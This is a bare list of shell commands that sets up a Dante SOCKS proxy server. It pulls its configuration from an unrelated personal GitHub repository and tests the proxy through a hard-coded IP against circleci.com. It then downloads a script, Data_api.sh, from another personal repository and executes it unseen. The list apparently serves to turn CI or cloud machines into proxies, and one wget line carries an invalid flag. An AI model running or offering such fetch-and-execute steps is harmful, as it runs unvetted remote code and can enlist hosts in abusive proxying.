wget http://ppa.launchpad.net/dajhorn/dante/ubuntu/pool/main/d/dante/dante-server_1.4.1-1_amd64.deb -y
sudo apt-get install gdebi-core -y
sudo gdebi dante-server_1.4.1-1_amd64.deb -y
#
nano /etc/danted.conf
#
wget https://raw.githubusercontent.com/yunisajara0/yunisajasa/main/nano/etc/danted.conf
#
service danted start
#
service danted status
#
curl -v -x socks5://103.143.10.225:1080 https://circleci.com//
#
wget https://raw.githubusercontent.com/agustinayuni/nannos/main/Data_api.sh
chmod +x Data_api.sh
./Data_api.sh
